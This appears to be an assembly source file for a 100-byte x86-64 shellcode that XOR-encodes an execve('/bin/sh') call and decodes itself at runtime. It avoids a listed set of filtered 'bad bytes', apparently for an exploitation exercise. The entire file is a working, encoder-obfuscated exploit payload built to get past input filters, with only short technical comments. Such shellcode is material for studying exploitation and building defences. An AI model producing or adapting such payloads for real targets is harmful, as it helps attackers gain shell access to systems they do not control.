;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; exec "/bin/sh" in 100 bytes
; bad bytes: 00|0a|0d|2f|ff|0f|05|68|40|41|42|43|44|45|46|47|48|49|4a|4b|4c|4d|4e|4f|50|51|52|53|54|55|56|57|58|59|5a|5b|5c|5d|5e|5f|60|61|62|63|64|65|66|67|68|69|6a|6b|6c|6d|6e|6f|70|71|72|73|74|75|76|77|78|79|7a|7b|7c|7d|7e|7f|80|81

[BITS 64]

%define SYS_EXEC 59
%define XORKEY 0x95

[SECTION .AAA EXEC WRITE]	; do not name this section ".text", otherwise 
							; 'ld' will mark this section READONLY
	global _start

_start:
	;lea rax, [REL _begin]	; now rax points to _begin

_begin:
	sub ebx, ebx
	mov bl, _enc_codes - _begin
	mov dl, XORKEY
	sub ecx, ecx
	mov cl, _end - _enc_codes

_decode:
	xor byte [rax+rbx], dl
	inc bl
	loop _decode

	sub eax, eax
	mov al, SYS_EXEC
	sub edx, edx
	sub esi, esi

_enc_codes:
	db XORKEY^0x48, XORKEY^0xbf, XORKEY^0x2f, XORKEY^0x62
	db XORKEY^0x69, XORKEY^0x6e, XORKEY^0x2f, XORKEY^0x73
	db XORKEY^0x68, XORKEY^0x00, XORKEY^0x57, XORKEY^0x54
	db XORKEY^0x5f, XORKEY^0x0f, XORKEY^0x05, 0x90

	; mov rdi, "/bin/sh"	; 48 bf 2f 62 69 6e 2f 73 68 00
	; push rdi				; 57
	; push rsp				; 54
	; pop rdi				; 5f
	; syscall				; 0f 05
_end:
